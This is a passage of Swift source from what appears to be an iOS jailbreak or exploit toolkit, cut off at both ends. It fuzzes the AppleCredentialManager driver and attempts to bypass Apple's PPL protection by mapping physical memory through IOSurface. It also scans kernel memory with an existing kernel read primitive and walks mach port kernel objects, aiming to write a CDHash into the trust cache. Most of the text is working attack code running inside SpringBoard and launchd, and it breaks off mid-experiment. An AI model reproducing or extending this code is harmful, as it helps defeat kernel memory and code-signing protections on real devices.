            RootExecutor.rcall(sb, "IOServiceClose", UInt64(ioSurfConnect))
        }
        
        // ═══ SUMMARY ═══
        detail += "\n=== SUMMARY ===\n"
        detail += "Anomalies found: \(anomalies.count)\n"
        for (target, result) in anomalies.prefix(15) {
            detail += "  \(target): \(result)\n"
        }
        
        if anomalies.isEmpty {
            detail += "No anomalies — all methods properly reject invalid input.\n"
            detail += "Drivers appear hardened against basic fuzzing.\n"
        } else {
            detail += "\nAnomalies need further investigation!\n"
            detail += "SUCCESS returns = method accepted our input\n"
            detail += "Unusual ret codes = potential edge case\n"
        }
        
        let success = !anomalies.isEmpty
        return ExperimentResult(name: "IOKit Fuzzer (LAST TRY)", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 67: Deep Fuzz AppleCredentialManager sel 0
    
    /// Selector 0 returns 0xfffffffd (-3) = custom error from driver logic
    /// This means our input REACHES the driver code!
    /// Now: find input that triggers different behavior (ret=0, crash, different ret)
    /// Strategy: vary struct size, content patterns, scalar vs struct
    private func expCredMgrDeepFuzz() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mem = sb.trojanMem
        var detail = "AppleCredentialManager Selector 0 — Deep Fuzz\n\n"
        var findings: [(String, UInt64)] = []
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOServiceMatching"))
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        
        // Open AppleCredentialManager
        let nameAddr = remote_alloc_str(sb, "AppleCredentialManager")
        let matchDict = RootExecutor.rcall(sb, "IOServiceMatching", nameAddr)
        let svc = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matchDict)
        guard svc != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Service not found", timestamp: Date())
        }
        let connectAddr = mem + 0x1A00
        sb[connectAddr].setValue32(0)
        let openRet = RootExecutor.rcall(sb, "IOServiceOpen", svc, taskSelf, 0, connectAddr)
        let connect = sb[connectAddr].value32()
        guard openRet == 0 && connect != 0 else {
            RootExecutor.rcall(sb, "free", nameAddr)
            return ExperimentResult(name: "CredMgr Deep Fuzz", success: false, detail: "Cannot open", timestamp: Date())
        }
        RootExecutor.rcall(sb, "free", nameAddr)
        detail += "connect=\(connect)\n\n"
        
        let structIn = mem + 0x2200
        let structOut = mem + 0x2400
        let structOutSize = mem + 0x2600
        let scalarIn = mem + 0x2800
        let scalarOut = mem + 0x2A00
        let scalarOutCnt = mem + 0x2C00
        
        let baseline: UInt64 = 0xfffffffd  // known return for sel 0
        
        // ═══ TEST 1: Vary struct input SIZE ═══
        detail += "=== Test 1: Vary struct size (sel 0) ===\n"
        let sizes: [UInt64] = [0, 4, 8, 12, 16, 20, 24, 32, 48, 64, 96, 128, 192, 256, 384, 512, 1024, 2048]
        
        for size in sizes {
            // Zero-fill input
            for i in stride(from: 0, to: min(Int(size), 256), by: 8) {
                sb[structIn + UInt64(i)].setValue64(0)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         size == 0 ? 0 : structIn, size,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! size=\(size): ret=0x\(String(format: "%x", ret)), outSize=\(outSize)\n"
                findings.append(("size=\(size)", ret))
                if ret == 0 {
                    detail += "     SUCCESS! Method accepted this size!\n"
                    // Read output
                    if outSize > 0 && outSize <= 64 {
                        var buf = [UInt8](repeating: 0, count: Int(outSize))
                        sb.remoteRead(structOut, to: &buf, size: outSize)
                        detail += "     output: \(buf.prefix(16).map { String(format: "%02x", $0) }.joined(separator: " "))\n"
                    }
                }
            } else {
                // Same as baseline — note but don't print all
                if size <= 32 || size == 512 || size == 2048 {
                    detail += "  size=\(size): ret=0xfffffffd (baseline)\n"
                }
            }
        }
        
        // ═══ TEST 2: Vary CONTENT at fixed size 32 ═══
        detail += "\n=== Test 2: Vary content (size=32) ===\n"
        let contentPatterns: [(String, [UInt64])] = [
            ("all_0x41", [0x4141414141414141, 0x4141414141414141, 0x4141414141414141, 0x4141414141414141]),
            ("incrementing", [0x0102030405060708, 0x090A0B0C0D0E0F10, 0x1112131415161718, 0x191A1B1C1D1E1F20]),
            ("ptr_pattern", [0x0000000100000001, 0x0000000200000002, 0, 0]),
            ("mach_msg_hdr", [0x00000013_00000000, 0x00000000_00000001, 0, 0]),  // fake mach msg
            ("xpc_dict", [0x0000F000_58504321, 0x0000000100000001, 0, 0]),  // fake XPC
            ("plist_magic", [0x6C70_7362, 0x0000_0100, 0, 0]),  // "bplist00"
            ("credential", [1, 0, 0x0000000100000000, 0]),  // type=1, version, data_ptr
            ("token_req", [0x746F6B65, 0x6E000000, 0, 0]),  // "token\0"
        ]
        
        for (name, pattern) in contentPatterns {
            for (i, val) in pattern.enumerated() {
                sb[structIn + UInt64(i * 8)].setValue64(val)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! \(name): ret=0x\(String(format: "%x", ret)), out=\(outSize)\n"
                findings.append((name, ret))
                if ret == 0 {
                    detail += "     SUCCESS!\n"
                }
            }
        }
        
        // ═══ TEST 3: Try SCALAR method instead of struct ═══
        detail += "\n=== Test 3: Scalar method (sel 0) ===\n"
        for inputCount in [0, 1, 2, 3, 4, 5, 6] as [UInt64] {
            sb[scalarIn].setValue64(0)
            sb[scalarIn + 8].setValue64(0)
            sb[scalarIn + 16].setValue64(0)
            sb[scalarIn + 24].setValue64(0)
            sb[scalarIn + 32].setValue64(0)
            sb[scalarIn + 40].setValue64(0)
            sb[scalarOutCnt].setValue32(16)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect), 0,
                                         inputCount == 0 ? 0 : scalarIn, inputCount,
                                         scalarOut, scalarOutCnt)
            let outCnt = sb[scalarOutCnt].value32()
            
            if ret != baseline && ret != 0xe00002c2 {
                detail += "  !! scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret)), outCnt=\(outCnt)\n"
                findings.append(("scalar_\(inputCount)", ret))
                if ret == 0 && outCnt > 0 {
                    let val = sb[scalarOut].value64()
                    detail += "     output[0]=0x\(String(format: "%llx", val))\n"
                }
            } else {
                detail += "  scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret))\n"
            }
        }
        
        // ═══ TEST 4: Try other selectors (1-5) with struct ═══
        detail += "\n=== Test 4: Other selectors (1-5) ===\n"
        for sel in 1...5 {
            sb[structIn].setValue64(0)
            sb[structIn + 8].setValue64(0)
            sb[structIn + 16].setValue64(0)
            sb[structIn + 24].setValue64(0)
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), UInt64(sel),
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret == 0 {
                detail += "  !! sel \(sel): SUCCESS! outSize=\(outSize)\n"
                findings.append(("sel_\(sel)", ret))
            } else if ret == baseline {
                detail += "  sel \(sel): ret=0xfffffffd (same as sel 0)\n"
            } else if ret != 0xe00002bc && ret != 0xe00002c2 {
                detail += "  sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                findings.append(("sel_\(sel)", ret))
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        
        // ═══ SUMMARY ═══
        detail += "\n=== FINDINGS ===\n"
        detail += "Baseline (sel 0, any input): 0xfffffffd (-3)\n"
        detail += "Deviations found: \(findings.count)\n"
        for (desc, ret) in findings {
            detail += "  \(desc): 0x\(String(format: "%x", ret))\n"
        }
        
        if findings.isEmpty {
            detail += "\nAll inputs return same -3. Method has single validation check\n"
            detail += "that fails regardless of input content/size.\n"
            detail += "Likely checks for a valid credential token we don't have.\n"
        } else {
            detail += "\nDIFFERENT RETURNS FOUND! This indicates:\n"
            detail += "- Different code paths reachable with different inputs\n"
            detail += "- Potential for finding valid input that passes checks\n"
            detail += "- Memory corruption possible if size-dependent\n"
        }
        
        let success = !findings.isEmpty
        return ExperimentResult(name: "CredMgr Deep Fuzz", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 68: PPL Bypass via IOSurface Physical Memory
    
    /// PPL protects VIRTUAL memory mappings. But IOSurface can map PHYSICAL memory.
    /// If we map the same physical page that backs trust cache → bypass PPL!
    /// From SpringBoard: create IOSurface with IOSurfaceAddress = physical addr
    /// A12 PPL is software-only (no HVC/SMC) → physical mapping might bypass it
    private func expPPLPhysicalBypass() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let _ = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "PPL Bypass via IOSurface Physical Memory\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Get IOSurface functions
        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
        let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
        let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
        
        detail += "IOSurfaceCreate: \(ioCreate != 0 ? "found" : "missing")\n"
        detail += "IOSurfaceGetBaseAddress: \(ioGetBase != 0 ? "found" : "missing")\n"
        
        guard ioCreate != 0 && ioGetBase != 0 else {
            detail += "IOSurface functions not available\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Create normal IOSurface first (get a known physical mapping)
        detail += "\n=== Step 2: Create reference IOSurface ===\n"
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        
        let refSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
        detail += "Reference surface: 0x\(String(format: "%llx", refSurface))\n"
        
        guard refSurface != 0 else {
            detail += "Cannot create reference surface\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", refSurface, 0, 0)
        let refBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", refSurface)
        detail += "Reference base addr: 0x\(String(format: "%llx", refBase))\n"
        
        // Write marker to reference surface
        if refBase != 0 {
            sb[refBase].setValue64(0xDEAD_BEEF_CAFE_BABE)
            let readBack = sb[refBase].value64()
            detail += "Marker write/read: 0x\(String(format: "%llx", readBack))\n"
        }
        RootExecutor.rcall(sb, "IOSurfaceUnlock", refSurface, 0, 0)
        
        // Step 3: Try IOSurface with IOSurfaceAddress (physical address mapping)
        detail += "\n=== Step 3: IOSurface with physical address ===\n"
        
        // Try various physical addresses:
        // - 0x800000000 = typical DRAM base on A12
        // - kernel_base physical = kernel_base - gVirtBase + gPhysBase
        // We don't know exact gPhysBase, but typical values:
        // A12: gPhysBase ~ 0x800000000, gVirtBase ~ 0xfffffff007004000
        
        let kernBase = mgr.kernbase
        // Estimate physical address of kernel (rough)
        // On A12, phys = virt - 0xfffffff007004000 + 0x800000000 (approximate)
        let estimatedPhysKern = kernBase - 0xfffffff007004000 + 0x800000000
        
        let testAddresses: [(String, UInt64)] = [
            ("DRAM base (0x800000000)", 0x800000000),
            ("DRAM +1MB", 0x800100000),
            ("DRAM +16MB", 0x801000000),
            ("Estimated kernel phys", estimatedPhysKern),
            ("Zero (should fail)", 0),
        ]
        
        var anyMapped = false
        
        for (name, physAddr) in testAddresses {
            // Create dict with IOSurfaceAddress
            let addrDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
            
            // Set IOSurfaceAddress = physical address
            // NSNumber with UInt64 value
            let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), physAddr, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
            
            let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", addrDict)
            
            if surface != 0 {
                // Surface created! Try to get base address
                RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
                
                if ioPrefetch != 0 {
                    RootExecutor.rcall(sb, "IOSurfacePrefetchPages", surface)
                }
                
                let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
                
                if baseAddr != 0 {
                    detail += "  \(name): MAPPED! base=0x\(String(format: "%llx", baseAddr))\n"
                    anyMapped = true
                    
                    // Try to read from mapped physical memory
                    let val = sb[baseAddr].value64()
                    detail += "    Read: 0x\(String(format: "%016llx", val))\n"
                    
                    // Check if this looks like kernel memory
                    if val == 0x100000CFEEDFACF || (val & 0xFFFF000000000000) == 0xFFFF000000000000 {
                        detail += "    KERNEL DATA DETECTED!\n"
                        detail += "    PPL BYPASS VIA PHYSICAL MEMORY!\n"
                    }
                } else {
                    detail += "  \(name): surface created but base=NULL\n"
                }
                
                RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
            } else {
                detail += "  \(name): create FAILED (rejected)\n"
            }
        }
        
        // Step 4: Alternative — use IOSurfaceMemoryRegion = "PurpleGfxMem"
        detail += "\n=== Step 4: PurpleGfxMem region ===\n"
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        detail += "PurpleGfxMem surface: 0x\(String(format: "%llx", gfxSurface))\n"
        
        if gfxSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
            detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
            
            if gfxBase != 0 {
                detail += "PurpleGfxMem MAPPED! This is physically contiguous memory.\n"
                detail += "Can be used for physical memory scanning.\n"
                anyMapped = true
            }
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        }
        
        // Summary
        detail += "\n=== RESULTS ===\n"
        if anyMapped {
            detail += "Physical memory mapping ACHIEVED!\n"
            detail += "Next: scan mapped memory for trust cache patterns\n"
            detail += "Then: write CDHash to trust cache → full jailbreak!\n"
        } else {
            detail += "All physical mapping attempts failed.\n"
            detail += "IOSurfaceAddress rejected from SpringBoard context.\n"
            detail += "PPL physical bypass NOT possible via this method.\n"
        }
        
        let success = anyMapped
        return ExperimentResult(name: "PPL Physical Bypass", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 69: Physical Memory Discovery
    
    /// Write unique marker to PurpleGfxMem (physically contiguous, mapped to userspace)
    /// Then from launchd (socket KRW), scan kernel memory near known addresses
    /// If we find our marker → we know the kernel virtual address of our physical page
    /// This reveals the phys↔virt relationship without needing gPhysBase!
    private func expPhysicalMemoryDiscovery(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let _ = rc.trojanMem
        let sbMem = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "Physical Memory Discovery\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Create PurpleGfxMem surface and write unique marker
        detail += "=== Step 1: Create PurpleGfxMem + write marker ===\n"
        
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Create large PurpleGfxMem surface (64KB for better chance of overlap)
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create PurpleGfxMem surface\n"
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        
        guard gfxBase != 0 else {
            detail += "PurpleGfxMem base is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
        detail += "Size: 64KB (0x10000)\n"
        
        // Write unique marker pattern every 4KB (page boundary)
        // Use memset + direct write via RemoteCall (not pointer subscript)
        let markerBase: UInt64 = 0xD5B1017B_00000000  // "DSPLOIT" + page index
        
        // First: zero the surface via memset to ensure it's paged in
        RootExecutor.rcall(sb, "memset", gfxBase, 0, 0x10000)
        
        // Now write markers using remote_write (more reliable than subscript)
        for page in 0..<16 {
            let marker = markerBase | UInt64(page)
            let offset = UInt64(page) * 0x1000
            let writeAddr = gfxBase + offset
            // Write 8 bytes at a time via trojanMem staging
            sb[sbMem + 0x3800].setValue64(marker)
            sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
            RootExecutor.rcall(sb, "memcpy", writeAddr, sbMem + 0x3800, 16)
        }
        
        // Verify markers written (read via memcpy to trojanMem)
        RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
        let verify = sb[sbMem + 0x3900].value64()
        detail += "Marker written: 0x\(String(format: "%llx", verify))\n"
        if verify == markerBase {
            detail += "MARKERS CONFIRMED!\n\n"
        } else {
            detail += "Marker verify: expected 0x\(String(format: "%llx", markerBase)), got 0x\(String(format: "%llx", verify))\n"
            detail += "Trying IOSurfacePrefetchPages first...\n"
            let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
            if ioPrefetch != 0 {
                RootExecutor.rcall(sb, "IOSurfacePrefetchPages", gfxSurface)
                // Retry write
                RootExecutor.rcall(sb, "memset", gfxBase, 0x41, 16)
                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                let verify2 = sb[sbMem + 0x3900].value64()
                detail += "After prefetch+write: 0x\(String(format: "%llx", verify2))\n"
                if verify2 != 0 {
                    // Now write real markers
                    for page in 0..<16 {
                        let marker = markerBase | UInt64(page)
                        let offset = UInt64(page) * 0x1000
                        sb[sbMem + 0x3800].setValue64(marker)
                        sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
                        RootExecutor.rcall(sb, "memcpy", gfxBase + offset, sbMem + 0x3800, 16)
                    }
                    RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                    let verify3 = sb[sbMem + 0x3900].value64()
                    detail += "Final marker: 0x\(String(format: "%llx", verify3))\n"
                }
            }
            detail += "\n"
        }
        
        // Step 2: From launchd context, scan kernel memory for our marker
        detail += "=== Step 2: Scan kernel memory for marker ===\n"
        detail += "Scanning near known accessible addresses...\n"
        
        // We know pmap_cs_allow_invalid is accessible at 0xfffffff00a0e45b8 + slide
        // Scan a small range around it (safe zone)
        let slide = mgr.kernslide
        let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
        
        var foundAt: UInt64 = 0
        var foundMarker: UInt64 = 0
        
        // Scan +-8 bytes at a time in the safe zone around pmap_cs
        // Only scan very close (within same page) to avoid panic
        detail += "Scanning pmap_cs page (safe zone)...\n"
        let pageBase = pmapCS & ~0x3FFF  // 16KB page aligned
        
        for offset in stride(from: 0, to: 0x4000, by: 8) {
            let addr = pageBase + UInt64(offset)
            let val = ds_kread64(addr)
            
            // Check if this matches our marker pattern
            if (val & 0xFFFFFFFF_00000000) == markerBase {
                foundAt = addr
                foundMarker = val
                detail += "MARKER FOUND at kernel vm=0x\(String(format: "%llx", addr))!\n"
                detail += "Value: 0x\(String(format: "%llx", val))\n"
                break
            }
        }
        
        if foundAt == 0 {
            // Marker not in pmap_cs page — try IOSurface kernel object
            // The IOSurface kernel object might be findable via our proc
            detail += "Not in pmap_cs page.\n"
            detail += "Trying: read IOSurface kernel object address...\n"
            
            // IOSurface objects are tracked in IOKit registry
            // We can find them via the IOSurfaceRoot user client connection
            // The surface's kernel backing is at a known offset in the IOSurface object
            
            // Alternative: use mach_make_memory_entry to get memory object port
            // then find it in kernel via port kobject
            let makeMemEntry = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "mach_make_memory_entry_64"))
            
            if makeMemEntry != 0 {
                detail += "\nmach_make_memory_entry_64 available\n"
                
                // mach_make_memory_entry_64(task, &size, address, prot, &object, parent)
                let sizeAddr = sbMem + 0x3000
                sb[sizeAddr].setValue64(0x10000)
                let objectAddr = sbMem + 0x3010
                sb[objectAddr].setValue32(0)
                
                let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
                let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                              taskSelf, sizeAddr, gfxBase,
                                              3, objectAddr, 0) // VM_PROT_READ|WRITE=3
                let memObject = sb[objectAddr].value32()
                detail += "mach_make_memory_entry_64: ret=0x\(String(format: "%x", meRet)), port=\(memObject)\n"
                
                if meRet == 0 && memObject != 0 {
                    detail += "Memory entry port obtained!\n"
                    detail += "This port's kobject in kernel = our physical pages!\n"
                    
                    // Now from launchd, find this port's kobject
                    // We need SpringBoard's task address to look up the port
                    let sbProc = mgr.findProc(name: "SpringBoard")
                    if sbProc != 0 {
                        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
                        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
                        detail += "SpringBoard task: 0x\(String(format: "%llx", sbTask))\n"
                        
                        // Note: reading task internals might panic (wrong zone)
                        // But this info is useful for future reference
                        detail += "Port \(memObject) in SB's IPC space → kernel object\n"
                        detail += "Kernel object contains physical page list!\n"
                    }
                }
            }
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Step 3: Results
        detail += "\n=== RESULTS ===\n"
        if foundAt != 0 {
            detail += "PHYSICAL MEMORY DISCOVERED!\n"
            detail += "Our PurpleGfxMem page found at kernel vm=0x\(String(format: "%llx", foundAt))\n"
            detail += "Marker: 0x\(String(format: "%llx", foundMarker))\n"
            let pageIdx = foundMarker & 0xF
            detail += "Page index: \(pageIdx)\n"
            detail += "Physical page mapped at userspace 0x\(String(format: "%llx", gfxBase + pageIdx * 0x1000))\n"
            detail += "\nWe can now:\n"
            detail += "1. Write to this kernel address via PurpleGfxMem (userspace)\n"
            detail += "2. Kernel sees the write immediately (same physical page)\n"
            detail += "3. If trust cache is on same/nearby page → WRITE CDHASH!\n"
        } else {
            detail += "Marker NOT found in accessible kernel memory.\n"
            detail += "PurpleGfxMem physical pages are in a different region\n"
            detail += "than what socket KRW can access.\n"
            detail += "\nBut: mach_make_memory_entry gives us a port to the pages.\n"
            detail += "Future: find port kobject → get physical address list.\n"
        }
        
        let success = foundAt != 0
        return ExperimentResult(name: "Phys Memory Discovery", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 70: Extract Physical Address from Port Kobject
    
    /// We have a mach port (from mach_make_memory_entry_64) that represents
    /// our PurpleGfxMem physical pages. The port's kobject is a vm_named_entry
    /// which contains the backing VM object → physical page addresses.
    ///
    /// Chain: port → IPC entry → ipc_port → kobject (vm_named_entry)
    ///        → backing_copy (vm_object) → physical pages
    ///
    /// If we can read the physical address → we know where our writable memory is
    /// → calculate offset to trust cache → map it → FULL JAILBREAK
    private func expExtractPhysAddr(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "Extract Physical Address from Port Kobject\n\n"
        
        // Step 1: Create PurpleGfxMem + get memory entry port (same as exp 69)
        detail += "=== Step 1: Get memory entry port ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create surface\n"
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
        
        // Get memory entry port
        let sizeAddr = sbMem + 0x3000
        sb[sizeAddr].setValue64(0x4000)
        let objectAddr = sbMem + 0x3010
        sb[objectAddr].setValue32(0)
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                       taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
        let memPort = sb[objectAddr].value32()
        detail += "Memory entry port: \(memPort), ret=0x\(String(format: "%x", meRet))\n"
        
        guard meRet == 0 && memPort != 0 else {
            detail += "Cannot get memory entry\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Find port's kobject in kernel
        detail += "\n=== Step 2: Find port kobject ===\n"
        
        // We need SpringBoard's task to look up the port
        let sbProc = mgr.findProc(name: "SpringBoard")
        guard sbProc != 0 else {
            detail += "Cannot find SpringBoard proc\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "SB proc: 0x\(String(format: "%llx", sbProc))\n"
        detail += "SB task: 0x\(String(format: "%llx", sbTask))\n"
        
        guard sbTask != 0 else {
            detail += "Cannot get SB task\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
